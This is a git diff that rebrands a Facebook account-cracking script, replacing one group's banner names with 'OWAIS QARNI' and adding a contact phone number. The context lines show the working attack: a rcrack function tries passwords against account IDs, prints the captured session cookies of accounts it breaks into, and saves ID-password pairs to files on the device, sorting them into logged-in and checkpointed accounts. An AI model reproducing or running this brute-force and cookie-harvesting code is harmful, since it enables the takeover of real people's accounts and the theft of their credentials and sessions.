@@ -93,27 +93,26 @@ bu = current.month
 ha = current.day
 today = date.today()
 logo =                                          (""" 
-\033[1;32m##     ##    ###    ########  ##      ##    ###    ##    ## 
-\033[1;35m###   ###   ## ##   ##     ## ##  ##  ##   ## ##   ###   ## 
-\033[1;35m#### ####  ##   ##  ##     ## ##  ##  ##  ##   ##  ####  ## 
-\033[1;32m## ### ## ##     ## ########  ##  ##  ## ##     ## ## ## ## 
-\033[1;32m##     ## ######### ##   ##   ##  ##  ## ######### ##  #### 
-\033[1;35m##     ## ##     ## ##    ##  ##  ##  ## ##     ## ##   ### 
-\033[1;35m##     ## ##     ## ##     ##  ###  ###  ##     ## ##    ## 
+ \033[1;32m_____  _   _ _____ ___________  ___   _     _____ 
+\033[1;35m/  __ \| | | |_   _|_   _| ___ \/ _ \ | |   |_   _|
+\033[1;35m| /  \/| |_| | | |   | | | |_/ / /_\ \| |     | |  
+\033[1;32m| |    |  _  | | |   | | |    /|  _  || |     | |  
+\033[1;32m| \__/\| | | |_| |_  | | | |\ \| | | || |_____| |_ 
+\033[1;35m \____/\_| |_/\___/  \_/ \_| \_\_| |_/\_____/\___/                                                                                                       
                                        
-\033[1;37m================= \33[32;45mYASIR_X_MARWAN\33[0;m =====================
-     Source By : AKING
-\033[1;32m     \033[1;33mCOPY PASTE BY\33[0;m   :  \033[1;33mYAsir\33[0;m\033[1;32m _X_ \033[1;33mMarwan\33[0;m
-\033[1;32m     \033[1;32mFACEBOK      : \033[96;1m YAasir\____ðŸ˜˜ðŸ˜ˆðŸ˜˜
-\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mYkimg
+\033[1;37m================= \33[32;45mOWAIS___QARNI\33[0;m =====================
+     Source By : OWAIS QARNI
+\033[1;32m     \033[1;33mCOPY PASTE BY\33[0;m   :  \033[1;33mOWAIS \033[1;33mQARNI\33[0;m
+\033[1;32m     \033[1;32mFACEBOK      : \033[96;1m OWAIS \____ðŸ˜˜ðŸ˜ˆðŸ˜˜
+\033[1;32m     \033[1;35mCONTACT       :  \033[1;35m+92 343 9276328
 \033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
-\033[1;32m     \033[1;35mTEAM         :  \033[1;35mKRS-LORA ðŸ¤£
+\033[1;32m     \033[1;35mTEAM         :  \033[1;35mCHITRALI
 \033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m2.4
-\033[1;37m================= \33[32;45mYAasirOo\33[0;m =====================
+\033[1;37m================= \33[32;45mOWAISOo\33[0;m =====================
 
-       \33[37;41m\t WELLCOME TO YAasirOo TOOL\33[0;m
+       \33[37;41m\t WELLCOME TO OWAIS TOOL\33[0;m
 
-\033[1;37m================== \33[32;45mNIDA\33[0;m ======================\n""")
+\033[1;37m================== \33[32;45mQARNI\33[0;m ======================\n""")
 loop = 0
 oks = []
 cps = []
@@ -264,22 +263,22 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\r\r\033[1;32m(ARYAN-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
+                print('\r\r\033[1;32m(OWAIS-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                 cek_apk(session,coki)
-                open('/sdcard/ARYAN-OK.txt', 'a').write( cid+' | '+ps+'\n')
+                open('/sdcard/OWAIS-OK.txt', 'a').write( cid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                print('\r\r\33[1;30m(ARYAN-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
-                open('/sdcard/ARYAN-CP.txt', 'a').write( cid+' | '+ps+' \n')
+                print('\r\r\33[1;30m(OWAIS-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
+                open('/sdcard/OWAIS-CP.txt', 'a').write( cid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write('\r\r%s[ARYAN] [%s/%s]  OK:- %s  CP:- %s '%(H,loop,tl,len(oks),len(cps))),
+        sys.stdout.write('\r\r%s[OWAIS] [%s/%s]  OK:- %s  CP:- %s '%(H,loop,tl,len(oks),len(cps))),
         sys.stdout.flush()
     except:
         pass
